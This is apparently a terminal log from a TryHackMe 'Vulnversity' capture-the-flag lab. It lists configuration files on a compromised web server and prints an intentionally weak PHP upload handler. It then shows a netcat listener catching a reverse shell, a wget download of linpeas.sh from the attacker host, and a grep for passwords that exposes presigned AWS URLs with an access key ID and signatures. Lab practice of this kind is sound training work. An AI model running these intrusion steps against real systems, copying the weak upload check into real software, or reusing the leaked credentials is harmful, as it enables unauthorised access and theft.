+/etc/apache2/mods-enabled/reqtimeout.conf
+/etc/apache2/mods-enabled/autoindex.conf
+/etc/apache2/mods-enabled/alias.conf
+/etc/apache2/mods-enabled/mpm_prefork.conf
+/etc/apache2/mods-enabled/php7.4.conf
+/etc/apache2/mods-enabled/deflate.conf
+/etc/apache2/mods-enabled/setenvif.conf
+/etc/apache2/mods-enabled/status.conf
+/etc/apache2/mods-enabled/mime.conf
+/etc/apache2/mods-enabled/dir.conf
+/etc/apache2/apache2.conf
+/etc/apache2/ports.conf
+/etc/apache2/mods-available/negotiation.conf
+/etc/apache2/mods-available/php7.0.conf
+/etc/apache2/mods-available/info.conf
+/etc/apache2/mods-available/reqtimeout.conf
+/etc/apache2/mods-available/ldap.conf
+/etc/apache2/mods-available/proxy_ftp.conf
+/etc/apache2/mods-available/autoindex.conf
+/etc/apache2/mods-available/proxy_html.conf
+/etc/apache2/mods-available/alias.conf
+/etc/apache2/mods-available/mpm_prefork.conf
+/etc/apache2/mods-available/cache_disk.conf
+/etc/apache2/mods-available/http2.conf
+/etc/apache2/mods-available/userdir.conf
+/etc/apache2/mods-available/proxy.conf
+/etc/apache2/mods-available/mime_magic.conf
+/etc/apache2/mods-available/mpm_event.conf
+/etc/apache2/mods-available/ssl.conf
+/etc/apache2/mods-available/mpm_worker.conf
+/etc/apache2/mods-available/php7.4.conf
+/etc/apache2/mods-available/deflate.conf
+/etc/apache2/mods-available/cgid.conf
+/etc/apache2/mods-available/proxy_balancer.conf
+/etc/apache2/mods-available/setenvif.conf
+/etc/apache2/mods-available/actions.conf
+/etc/apache2/mods-available/dav_fs.conf
+/etc/apache2/mods-available/status.conf
+/etc/apache2/mods-available/mime.conf
+/etc/apache2/mods-available/dir.conf
+/etc/apache2/mods-available/php7.2.conf
+/etc/apache2/conf-enabled/serve-cgi-bin.conf
+/etc/apache2/conf-enabled/other-vhosts-access-log.conf
+/etc/apache2/conf-enabled/charset.conf
+/etc/apache2/conf-enabled/security.conf
+/etc/apache2/conf-enabled/localized-error-pages.conf
+/etc/vmware-tools/vgauth.conf
+/etc/vmware-tools/tools.conf
+/etc/tmpfiles.d/screen-cleanup.conf
+/etc/sysctl.d/10-ipv6-privacy.conf
+/etc/sysctl.d/10-kernel-hardening.conf
+/etc/sysctl.d/10-ptrace.conf
+/etc/sysctl.d/99-sysctl.conf
+/etc/sysctl.d/10-magic-sysrq.conf
+/etc/sysctl.d/10-console-messages.conf
+/etc/sysctl.d/10-network-security.conf
+/etc/sysctl.d/10-zeropage.conf
+/etc/apparmor/parser.conf
+/etc/php/7.0/fpm/pool.d/www.conf
+/etc/php/7.0/fpm/php-fpm.conf
+/etc/xdg/user-dirs.conf
+/etc/sysctl.conf
+/etc/depmod.d/ubuntu.conf
+/etc/multipath.conf
+/etc/fail2ban/paths-arch.conf
+/etc/fail2ban/paths-opensuse.conf
+/etc/fail2ban/paths-common.conf
+/etc/fail2ban/filter.d/freeswitch.conf
+/etc/fail2ban/filter.d/named-refused.conf
+/etc/fail2ban/filter.d/selinux-common.conf
+/etc/fail2ban/filter.d/sendmail-reject.conf
+/etc/fail2ban/filter.d/ejabberd-auth.conf
+/etc/fail2ban/filter.d/dropbear.conf
+/etc/fail2ban/filter.d/botsearch-common.conf
+/etc/fail2ban/filter.d/apache-auth.conf
+/etc/fail2ban/filter.d/sendmail-auth.conf
+/etc/fail2ban/filter.d/lighttpd-auth.conf
+/etc/fail2ban/filter.d/drupal-auth.conf
+/etc/fail2ban/filter.d/apache-shellshock.conf
+/etc/fail2ban/filter.d/nginx-botsearch.conf
+/etc/fail2ban/filter.d/oracleims.conf
+/etc/fail2ban/filter.d/domino-smtp.conf
+/etc/fail2ban/filter.d/apache-overflows.conf
+/etc/fail2ban/filter.d/traefik-auth.conf
+/etc/fail2ban/filter.d/stunnel.conf
+/etc/fail2ban/filter.d/dovecot.conf
+/etc/fail2ban/filter.d/horde.conf
+/etc/fail2ban/filter.d/3proxy.conf
+/etc/fail2ban/filter.d/guacamole.conf
+/etc/fail2ban/filter.d/monit.conf
+/etc/fail2ban/filter.d/common.conf
+/etc/fail2ban/filter.d/proftpd.conf
+/etc/fail2ban/filter.d/postfix-rbl.conf
+/etc/fail2ban/filter.d/postfix-sasl.conf
+/etc/fail2ban/filter.d/selinux-ssh.conf
+/etc/fail2ban/filter.d/exim.conf
+/etc/fail2ban/filter.d/webmin-auth.conf
+/etc/fail2ban/filter.d/apache-botsearch.conf
+/etc/fail2ban/filter.d/slapd.conf
+/etc/fail2ban/filter.d/sshd.conf
+/etc/fail2ban/filter.d/mysqld-auth.conf
+/etc/fail2ban/filter.d/apache-modsecurity.conf
+/etc/fail2ban/filter.d/centreon.conf
+/etc/fail2ban/filter.d/haproxy-http-auth.conf
+/etc/fail2ban/filter.d/froxlor-auth.conf
+/etc/fail2ban/filter.d/vsftpd.conf
+/etc/fail2ban/filter.d/squid.conf
+/etc/fail2ban/filter.d/nsd.conf
+/etc/fail2ban/filter.d/tine20.conf
+/etc/fail2ban/filter.d/openwebmail.conf
+/etc/fail2ban/filter.d/zoneminder.conf
+/etc/fail2ban/filter.d/suhosin.conf
+/etc/fail2ban/filter.d/apache-common.conf
+/etc/fail2ban/filter.d/nagios.conf
+/etc/fail2ban/filter.d/asterisk.conf
+/etc/fail2ban/filter.d/solid-pop3d.conf
+/etc/fail2ban/filter.d/pam-generic.conf
+/etc/fail2ban/filter.d/pure-ftpd.conf
+/etc/fail2ban/filter.d/uwimap-auth.conf
+/etc/fail2ban/filter.d/postfix.conf
+/etc/fail2ban/filter.d/portsentry.conf
+/etc/fail2ban/filter.d/sieve.conf
+/etc/fail2ban/filter.d/openhab.conf
+/etc/fail2ban/filter.d/roundcube-auth.conf
+/etc/fail2ban/filter.d/perdition.conf
+/etc/fail2ban/filter.d/courier-smtp.conf
+/etc/fail2ban/filter.d/znc-adminlog.conf
+/etc/fail2ban/filter.d/screensharingd.conf
+/etc/fail2ban/filter.d/bitwarden.conf
+/etc/fail2ban/filter.d/assp.conf
+/etc/fail2ban/filter.d/exim-spam.conf
+/etc/fail2ban/filter.d/apache-pass.conf
+/etc/fail2ban/filter.d/counter-strike.conf
+/etc/fail2ban/filter.d/php-url-fopen.conf
+/etc/fail2ban/filter.d/apache-fakegooglebot.conf
+/etc/fail2ban/filter.d/nginx-limit-req.conf
+/etc/fail2ban/filter.d/mongodb-auth.conf
+/etc/fail2ban/filter.d/sogo-auth.conf
+/etc/fail2ban/filter.d/apache-nohome.conf
+/etc/fail2ban/filter.d/murmur.conf
+/etc/fail2ban/filter.d/exim-common.conf
+/etc/fail2ban/filter.d/phpmyadmin-syslog.conf
+/etc/fail2ban/filter.d/sshd-ddos.conf
+/etc/fail2ban/filter.d/groupoffice.conf
+/etc/fail2ban/filter.d/directadmin.conf
+/etc/fail2ban/filter.d/squirrelmail.conf
+/etc/fail2ban/filter.d/courier-auth.conf
+/etc/fail2ban/filter.d/nginx-http-auth.conf
+/etc/fail2ban/filter.d/qmail.conf
+/etc/fail2ban/filter.d/gssftpd.conf
+/etc/fail2ban/filter.d/recidive.conf
+/etc/fail2ban/filter.d/apache-noscript.conf
+/etc/fail2ban/filter.d/xinetd-fail.conf
+/etc/fail2ban/filter.d/kerio.conf
+/etc/fail2ban/filter.d/cyrus-imap.conf
+/etc/fail2ban/filter.d/wuftpd.conf
+/etc/fail2ban/filter.d/apache-badbots.conf
+/etc/fail2ban/paths-debian.conf
+/etc/fail2ban/fail2ban.conf
+/etc/fail2ban/jail.conf
+/etc/fail2ban/action.d/mail-whois-common.conf
+/etc/fail2ban/action.d/firewallcmd-new.conf
+/etc/fail2ban/action.d/firewallcmd-allports.conf
+/etc/fail2ban/action.d/firewallcmd-ipset.conf
+/etc/fail2ban/action.d/ipfw.conf
+/etc/fail2ban/action.d/iptables-multiport.conf
+/etc/fail2ban/action.d/sendmail-whois-matches.conf
+/etc/fail2ban/action.d/pf.conf
+/etc/fail2ban/action.d/mail-buffered.conf
+/etc/fail2ban/action.d/iptables.conf
+/etc/fail2ban/action.d/firewallcmd-rich-rules.conf
+/etc/fail2ban/action.d/nftables.conf
+/etc/fail2ban/action.d/mail-whois-lines.conf
+/etc/fail2ban/action.d/iptables-ipset-proto4.conf
+/etc/fail2ban/action.d/nftables-common.conf
+/etc/fail2ban/action.d/shorewall.conf
+/etc/fail2ban/action.d/apf.conf
+/etc/fail2ban/action.d/mynetwatchman.conf
+/etc/fail2ban/action.d/hostsdeny.conf
+/etc/fail2ban/action.d/iptables-new.conf
+/etc/fail2ban/action.d/route.conf
+/etc/fail2ban/action.d/shorewall-ipset-proto6.conf
+/etc/fail2ban/action.d/firewallcmd-multiport.conf
+/etc/fail2ban/action.d/sendmail.conf
+/etc/fail2ban/action.d/iptables-multiport-log.conf
+/etc/fail2ban/action.d/sendmail-common.conf
+/etc/fail2ban/action.d/badips.conf
+/etc/fail2ban/action.d/symbiosis-blacklist-allports.conf
+/etc/fail2ban/action.d/helpers-common.conf
+/etc/fail2ban/action.d/ufw.conf
+/etc/fail2ban/action.d/nftables-allports.conf
+/etc/fail2ban/action.d/iptables-common.conf
+/etc/fail2ban/action.d/netscaler.conf
+/etc/fail2ban/action.d/nftables-multiport.conf
+/etc/fail2ban/action.d/firewallcmd-common.conf
+/etc/fail2ban/action.d/sendmail-buffered.conf
+/etc/fail2ban/action.d/complain.conf
+/etc/fail2ban/action.d/iptables-xt_recent-echo.conf
+/etc/fail2ban/action.d/ipfilter.conf
+/etc/fail2ban/action.d/cloudflare.conf
+/etc/fail2ban/action.d/sendmail-whois-lines.conf
+/etc/fail2ban/action.d/dummy.conf
+/etc/fail2ban/action.d/sendmail-whois-ipmatches.conf
+/etc/fail2ban/action.d/bsd-ipfw.conf
+/etc/fail2ban/action.d/iptables-ipset-proto6.conf
+/etc/fail2ban/action.d/firewallcmd-rich-logging.conf
+/etc/fail2ban/action.d/mail.conf
+/etc/fail2ban/action.d/iptables-ipset-proto6-allports.conf
+/etc/fail2ban/action.d/sendmail-whois-ipjailmatches.conf
+/etc/fail2ban/action.d/osx-ipfw.conf
+/etc/fail2ban/action.d/sendmail-geoip-lines.conf
+/etc/fail2ban/action.d/sendmail-whois.conf
+/etc/fail2ban/action.d/iptables-allports.conf
+/etc/fail2ban/action.d/abuseipdb.conf
+/etc/fail2ban/action.d/dshield.conf
+/etc/fail2ban/action.d/blocklist_de.conf
+/etc/fail2ban/action.d/xarf-login-attack.conf
+/etc/fail2ban/action.d/nginx-block-map.conf
+/etc/fail2ban/action.d/mail-whois.conf
+/etc/fail2ban/action.d/osx-afctl.conf
+/etc/fail2ban/action.d/npf.conf
+/etc/fail2ban/action.d/nsupdate.conf
+/etc/fail2ban/jail.d/defaults-debian.conf
+/etc/PackageKit/PackageKit.conf
+/etc/PackageKit/Vendor.conf
+/etc/iscsi/iscsid.conf
+/etc/overlayroot.conf
+/var/lib/ucf/cache/:etc:samba:smb.conf
+/var/lib/ucf/cache/:etc:rsyslog.d:50-default.conf
+/var/lib/samba/dhcp.conf
+/var/snap/lxd/common/lxc/local.conf
+/lib/systemd/resolv.conf
+/lib/systemd/system/user@.service.d/timeout.conf
+/lib/systemd/system/user-.slice.d/10-defaults.conf
+/lib/systemd/system/sshd-keygen@.service.d/disable-sshd-keygen-if-cloud-init-active.conf
+/lib/systemd/system/rc-local.service.d/debian.conf
+/lib/modprobe.d/systemd.conf
+/lib/modprobe.d/fbdev-blacklist.conf
+/lib/modprobe.d/aliases.conf
+/lib/modprobe.d/blacklist_linux_4.15.0-213-generic.conf
+/lib/modprobe.d/blacklist_linux_4.4.0-142-generic.conf
+/lib/modprobe.d/blacklist_linux-hwe-5.15_5.15.0-139-generic.conf
+/lib/modprobe.d/blacklist_linux_5.4.0-216-generic.conf
+/lib/modprobe.d/blacklist_linux_4.4.0-210-generic.conf
+/lib/tmpfiles.d/multipath.conf
+/snap/snapd/24505/usr/lib/environment.d/990-snapd.conf
+/snap/snapd/24505/usr/lib/snapd/apparmor/parser.conf
+/snap/snapd/24505/usr/lib/tmpfiles.d/snapd.conf
+/snap/snapd/24505/usr/lib/x86_64-linux-gnu/gconv/gconv-modules.d/gconv-modules-extra.conf
+/snap/snapd/24505/usr/share/dbus-1/session.d/snapd.session-services.conf
+/snap/snapd/24505/usr/share/dbus-1/system.d/snapd.system-services.conf
+/snap/lxd/32662/etc/logrotate.conf
+/snap/lxd/32662/etc/lvm/lvm.conf
+/snap/lxd/32662/lxc/config/common.conf.d/00-lxcfs.conf
+/snap/lxd/32662/lxc/config/common.conf.d/01-local.conf
+/snap/core20/2582/etc/adduser.conf
+/snap/core20/2582/etc/apparmor/parser.conf
+/snap/core20/2582/etc/ca-certificates.conf
+/snap/core20/2582/etc/dbus-1/system.d/wpa_supplicant.conf
+/snap/core20/2582/etc/deluser.conf
+/snap/core20/2582/etc/depmod.d/ubuntu.conf
+/snap/core20/2582/etc/dhcp/dhclient.conf
+/snap/core20/2582/etc/e2scrub.conf
+/snap/core20/2582/etc/host.conf
+/snap/core20/2582/etc/ld.so.conf
+/snap/core20/2582/etc/ld.so.conf.d/i386-linux-gnu.conf
+/snap/core20/2582/etc/ld.so.conf.d/libc.conf
+/snap/core20/2582/etc/ld.so.conf.d/x86_64-linux-gnu.conf
+/snap/core20/2582/etc/libaudit.conf
+/snap/core20/2582/etc/modprobe.d/blacklist-ath_pci.conf
+/snap/core20/2582/etc/modprobe.d/blacklist-firewire.conf
+/snap/core20/2582/etc/modprobe.d/blacklist-framebuffer.conf
+/snap/core20/2582/etc/modprobe.d/blacklist-rare-network.conf
+/snap/core20/2582/etc/modprobe.d/blacklist.conf
+/snap/core20/2582/etc/modprobe.d/iwlwifi.conf
+/snap/core20/2582/etc/modules-load.d/modules.conf
+/snap/core20/2582/etc/nsswitch.conf
+/snap/core20/2582/etc/resolv.conf
+/snap/core20/2582/etc/rsyslog.d/21-cloudinit.conf
+/snap/core20/2582/etc/security/access.conf
+/snap/core20/2582/etc/security/faillock.conf
+/snap/core20/2582/etc/security/group.conf
+/snap/core20/2582/etc/security/limits.conf
+/snap/core20/2582/etc/security/namespace.conf
+/snap/core20/2582/etc/security/pam_env.conf
+/snap/core20/2582/etc/security/pwquality.conf
+/snap/core20/2582/etc/security/sepermit.conf
+/snap/core20/2582/etc/security/time.conf
+/snap/core20/2582/etc/sysctl.d/10-console-messages.conf
+/snap/core20/2582/etc/sysctl.d/10-ipv6-privacy.conf
+/snap/core20/2582/etc/sysctl.d/10-kernel-hardening.conf
+/snap/core20/2582/etc/sysctl.d/10-link-restrictions.conf
+/snap/core20/2582/etc/sysctl.d/10-magic-sysrq.conf
+/snap/core20/2582/etc/sysctl.d/10-network-security.conf
+/snap/core20/2582/etc/sysctl.d/10-ptrace.conf
+/snap/core20/2582/etc/sysctl.d/10-zeropage.conf
+/snap/core20/2582/etc/systemd/bootchart.conf
+/snap/core20/2582/etc/systemd/journald.conf
+/snap/core20/2582/etc/systemd/logind.conf
+/snap/core20/2582/etc/systemd/networkd.conf
+/snap/core20/2582/etc/systemd/pstore.conf
+/snap/core20/2582/etc/systemd/resolved.conf
+/snap/core20/2582/etc/systemd/sleep.conf
+/snap/core20/2582/etc/systemd/system.conf
+/snap/core20/2582/etc/systemd/system.conf.d/11-snapd-ctrl-alt-del-burst.conf
+/snap/core20/2582/etc/systemd/timesyncd.conf
+/snap/core20/2582/etc/systemd/user.conf
+/snap/core20/2582/etc/ucf.conf
+/snap/core20/2582/etc/udev/udev.conf
+/snap/core20/2582/etc/xattr.conf
+/snap/core20/2582/run/systemd/resolve/stub-resolv.conf
+/snap/core20/2582/usr/lib/NetworkManager/conf.d/no-mac-addr-change.conf
+/snap/core20/2582/usr/lib/environment.d/99-environment.conf
+/snap/core20/2582/usr/lib/finalrd/finalrd-static.conf
+/snap/core20/2582/usr/lib/initramfs-tools/etc/dhcp/dhclient.conf
+/snap/core20/2582/usr/lib/modprobe.d/aliases.conf
+/snap/core20/2582/usr/lib/modprobe.d/fbdev-blacklist.conf
+/snap/core20/2582/usr/lib/modprobe.d/systemd.conf
+/snap/core20/2582/usr/lib/sysctl.d/50-default.conf
+/snap/core20/2582/usr/lib/sysctl.d/50-pid-max.conf
+/snap/core20/2582/usr/lib/sysctl.d/protect-links.conf
+/snap/core20/2582/usr/lib/systemd/bootchart.conf.d/ubuntu-core.conf
+/snap/core20/2582/usr/lib/systemd/resolv.conf
+/snap/core20/2582/usr/lib/systemd/system/debug-shell.service.d/core-override.conf
+/snap/core20/2582/usr/lib/systemd/system/emergency.service.d/core-override.conf
+/snap/core20/2582/usr/lib/systemd/system/emergency.target.d/core-override.conf
+/snap/core20/2582/usr/lib/systemd/system/getty@.service.d/console-conf.conf
+/snap/core20/2582/usr/lib/systemd/system/rc-local.service.d/debian.conf
+/snap/core20/2582/usr/lib/systemd/system/secureboot-db.service.d/core-override.conf
+/snap/core20/2582/usr/lib/systemd/system/serial-getty@.service.d/console-conf-serial.conf
+/snap/core20/2582/usr/lib/systemd/system/sshd-keygen@.service.d/disable-sshd-keygen-if-cloud-init-active.conf
+/snap/core20/2582/usr/lib/systemd/system/systemd-bootchart.service.d/ubuntu-core.conf
+/snap/core20/2582/usr/lib/systemd/system/user-.slice.d/10-defaults.conf
+/snap/core20/2582/usr/lib/systemd/system/user@.service.d/timeout.conf
+/snap/core20/2582/usr/lib/sysusers.d/basic.conf
+/snap/core20/2582/usr/lib/sysusers.d/dbus.conf
+/snap/core20/2582/usr/lib/sysusers.d/systemd.conf
+/snap/core20/2582/usr/lib/tmpfiles.d/cryptsetup.conf
+/snap/core20/2582/usr/lib/tmpfiles.d/dbus.conf
+/snap/core20/2582/usr/lib/tmpfiles.d/debian.conf
+/snap/core20/2582/usr/lib/tmpfiles.d/home.conf
+/snap/core20/2582/usr/lib/tmpfiles.d/journal-nocow.conf
+/snap/core20/2582/usr/lib/tmpfiles.d/journald-conf-d.conf
+/snap/core20/2582/usr/lib/tmpfiles.d/legacy.conf
+/snap/core20/2582/usr/lib/tmpfiles.d/passwd.conf
+/snap/core20/2582/usr/lib/tmpfiles.d/static-nodes-permissions.conf
+/snap/core20/2582/usr/lib/tmpfiles.d/sudo.conf
+/snap/core20/2582/usr/lib/tmpfiles.d/systemd-nologin.conf
+/snap/core20/2582/usr/lib/tmpfiles.d/systemd-tmp.conf
+/snap/core20/2582/usr/lib/tmpfiles.d/systemd.conf
+/snap/core20/2582/usr/lib/tmpfiles.d/tmp.conf
+/snap/core20/2582/usr/lib/tmpfiles.d/var.conf
+/snap/core20/2582/usr/lib/tmpfiles.d/x11.conf
+/snap/core20/2582/usr/share/adduser/adduser.conf
+/snap/core20/2582/usr/share/dbus-1/session.conf
+/snap/core20/2582/usr/share/dbus-1/system.conf
+/snap/core20/2582/usr/share/dbus-1/system.d/io.netplan.Netplan.conf
+/snap/core20/2582/usr/share/dbus-1/system.d/org.freedesktop.hostname1.conf
+/snap/core20/2582/usr/share/dbus-1/system.d/org.freedesktop.locale1.conf
+/snap/core20/2582/usr/share/dbus-1/system.d/org.freedesktop.login1.conf
+/snap/core20/2582/usr/share/dbus-1/system.d/org.freedesktop.network1.conf
+/snap/core20/2582/usr/share/dbus-1/system.d/org.freedesktop.resolve1.conf
+/snap/core20/2582/usr/share/dbus-1/system.d/org.freedesktop.systemd1.conf
+/snap/core20/2582/usr/share/dbus-1/system.d/org.freedesktop.timedate1.conf
+/snap/core20/2582/usr/share/dbus-1/system.d/org.freedesktop.timesync1.conf
+/snap/core20/2582/usr/share/libc-bin/nsswitch.conf
+www-data@ip-10-67-136-59:/$ cat /var/www/html/internal/*.php 2>/dev/null
+<html>
+<head>
+<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
+<style>
+html, body {
+    height: 30%;
+}
+html {
+    display: table;
+    margin: auto;
+}
+body {
+    display: table-cell;
+    vertical-align: middle;
+    text-align: center;
+}
+</style>
+</head>
+<body>
+<form action="index.php" method="post" enctype="multipart/form-data">
+    <h3>Upload</h3><br />
+    <input type="file" name="file" id="file">
+    <input class="btn btn-primary" type="submit" value="Submit" name="submit">
+</form>
+<?php
+   if(isset($_FILES['file'])){
+      $errors= array();
+      $file_name = $_FILES['file']['name'];
+      $file_tmp =$_FILES['file']['tmp_name'];
+      $file_type=$_FILES['file']['type'];
+      $file_ext=strtolower(end(explode('.',$_FILES['file']['name'])));
+      
+      $extensions= array("phtml");
+      
+      if(in_array($file_ext,$extensions)=== false){
+         $errors="Extension not allowed";
+      }
+            
+      if(empty($errors)==true){
+         move_uploaded_file($file_tmp,"uploads/".$file_name);
+         echo "Success";
+      }else{
+         print_r($errors);
+      }
+   }
+?>
+</body>
+</html>
+www-data@ip-10-67-136-59:/$ ls -la /var/www/html/internal/
+total 20
+drwxr-xr-x 4 www-data www-data 4096 Jul 31  2019 .
+drwxr-xr-x 8 www-data www-data 4096 Jul 31  2019 ..
+drwxr-xr-x 2 www-data www-data 4096 Jul 31  2019 css
+-rw-r--r-- 1 www-data www-data 1128 Jul 31  2019 index.php
+drwxr-xr-x 2 www-data www-data 4096 Oct  8 11:27 uploads
+www-data@ip-10-67-136-59:/$                                                                                     
+┌──(kali㉿kali)-[~/TP_THM/vulnversity]
+└─$ nc -lvnp 1234
+listening on [any] 1234 ...
+^C
+                                                                                    
+┌──(kali㉿kali)-[~/TP_THM/vulnversity]
+└─$ ping -c 3 10.64.151.210
+PING 10.64.151.210 (10.64.151.210) 56(84) bytes of data.
+
+--- 10.64.151.210 ping statistics ---
+3 packets transmitted, 0 received, 100% packet loss, time 2047ms
+
+                                                                                    
+┌──(kali㉿kali)-[~/TP_THM/vulnversity]
+└─$ curl -s http://10.64.151.210:3333/ -o /dev/null -w "%{http_code}\n"
+000
+                                                                                    
+┌──(kali㉿kali)-[~/TP_THM/vulnversity]
+└─$ nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [192.168.151.44] from (UNKNOWN) [10.64.151.210] 49860
+Linux ip-10-64-151-210 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+ 11:54:04 up 6 min,  0 users,  load average: 0.11, 0.32, 0.18
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ cd /tmp
+wget http://192.168.151.44:8000/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh > /tmp/linpeas_output.txt 2>&1$ --2026-10-08 11:55:52--  http://192.168.151.44:8000/linpeas.sh
+Connecting to 192.168.151.44:8000... connected.
+HTTP request sent, awaiting response... 404 File not found
+2026-10-08 11:55:55 ERROR 404: File not found.
+
+$ chmod: cannot access 'linpeas.sh': No such file or directory
+$ cd /tmp
+wget http://192.168.151.44:8000/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh > /tmp/linpeas_output.txt 2>&1/bin/sh: 5: Syntax error: Bad fd number
+$ --2026-10-08 11:59:55--  http://192.168.151.44:8000/linpeas.sh
+Connecting to 192.168.151.44:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1303991 (1.2M) [application/x-sh]
+Saving to: 'linpeas.sh'
+
+     0K .......... .......... .......... .......... ..........  3% 37.5K 33s
+    50K .......... .......... .......... .......... ..........  7%  133K 20s
+   100K .......... .......... .......... .......... .......... 11%  296K 14s
+   150K .......... .......... .......... .......... .......... 15%  297K 11s
+   200K .......... .......... .......... .......... .......... 19%  495K 9s
+   250K .......... .......... .......... .......... .......... 23%  568K 7s
+   300K .......... .......... .......... .......... .......... 27%  543K 6s
+   350K .......... .......... .......... .......... .......... 31%  473K 5s
+   400K .......... .......... .......... .......... .......... 35%  462K 5s
+   450K .......... .......... .......... .......... .......... 39%  474K 4s
+   500K .......... .......... .......... .......... .......... 43%  432K 4s
+   550K .......... .......... .......... .......... .......... 47%  535K 3s
+   600K .......... .......... .......... .......... .......... 51%  517K 3s
+   650K .......... .......... .......... .......... .......... 54%  461K 3s
+   700K .......... .......... .......... .......... .......... 58%  306K 2s
+   750K .......... .......... .......... .......... .......... 62%  202K 2s
+   800K .......... .......... .......... .......... .......... 66%  693K 2s
+   850K .......... .......... .......... .......... .......... 70%  961K 1s
+   900K .......... .......... .......... .......... .......... 74%  760K 1s
+   950K .......... .......... .......... .......... .......... 78%  361K 1s
+  1000K .......... .......... .......... .......... .......... 82% 1.50M 1s
+  1050K .......... .......... .......... .......... .......... 86% 1.69M 1s
+  1100K .......... .......... .......... .......... .......... 90%  410K 0s
+  1150K .......... .......... .......... .......... .......... 94% 1.96M 0s
+  1200K .......... .......... .......... .......... .......... 98% 1.57M 0s
+  1250K .......... .......... ...                             100%  265K=4.1s
+
+2026-10-08 12:00:00 (308 KB/s) - 'linpeas.sh' saved [1303991/1303991]
+
+$ $ chmod +x linpeas.sh
+./linpeas.sh > /tmp/linpeas_output.txt 2>&1/bin/sh: 8: Syntax error: Bad fd number
+$ 
+$ grep -i "password\|credential" /tmp/linpeas_output.txt | grep -v "^#" | head -30
+  - 'wget -O /etc/badr/badr "https://tryhackme-badr-deployment-production-us-east-1.s3.us-east-1.amazonaws.com/badr?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIA2YR2KKQM72S2IX6B%2F20261008%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261008T154612Z&X-Amz-Expires=480&X-Amz-Signature=d184baea13b36ec836f6ed3e9fbf1472740f819796e15ba4cf8a1cf4eb44d732&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"'
+  - 'wget -O /etc/badr/config.yaml "https://tryhackme-badr-deployment-production-us-east-1.s3.us-east-1.amazonaws.com/config.yaml?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIA2YR2KKQM72S2IX6B%2F20261008%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261008T154612Z&X-Amz-Expires=480&X-Amz-Signature=12b847d2f6eefa1fddbc217f29c8301ed1ff09927313e3109801cbc6bef21191&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"'
+  - 'wget -O /etc/badr/rules.yaml "https://tryhackme-badr-deployment-production-us-east-1.s3.us-east-1.amazonaws.com/rules.yaml?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIA2YR2KKQM72S2IX6B%2F20261008%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261008T154612Z&X-Amz-Expires=480&X-Amz-Signature=12bd834621416cb0f2f56a62c2bb57066c5c4c1a0f629bfa5c32526769819f1a&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"'
+  - 'wget -O /etc/badr/room.config.yaml "https://tryhackme-badr-deployment-production-us-east-1.s3.us-east-1.amazonaws.com/vulnversity/rules.yaml?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIA2YR2KKQM72S2IX6B%2F20261008%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261008T154612Z&X-Amz-Expires=480&X-Amz-Signature=1b3985f412126ee3f0d9ea054a275826d30a2a46175507cd5e89d3fda119a8b7&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"'
+  - 'wget -O /etc/badr/room.rules.yaml "https://tryhackme-badr-deployment-production-us-east-1.s3.us-east-1.amazonaws.com/vulnversity/cat-dash-rules.yaml?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIA2YR2KKQM72S2IX6B%2F20261008%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261008T154612Z&X-Amz-Expires=480&X-Amz-Signature=849194113d5998846633c3908fa9a9862071ca550b1e1ca78a38be08d9feaba8&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"'
+  - 'wget -O /etc/badr/badr-client-key.pem "https://tryhackme-badr-deployment-production-us-east-1.s3.us-east-1.amazonaws.com/badr-client-key.pem?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIA2YR2KKQM72S2IX6B%2F20261008%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261008T154612Z&X-Amz-Expires=480&X-Amz-Signature=cd052ba73ca78f2be576c1cc56b8d77e20110959ba4b1234c999b038a4aaa8f8&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"'
+  - 'wget -O /etc/badr/badr-client-cert.pem "https://tryhackme-badr-deployment-production-us-east-1.s3.us-east-1.amazonaws.com/badr-client-cert.pem?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIA2YR2KKQM72S2IX6B%2F20261008%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261008T154612Z&X-Amz-Expires=480&X-Amz-Signature=88c85c6214bf2b5376b4541f8b753c59e248d80af7870a49018e00b1b97e1983&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"'
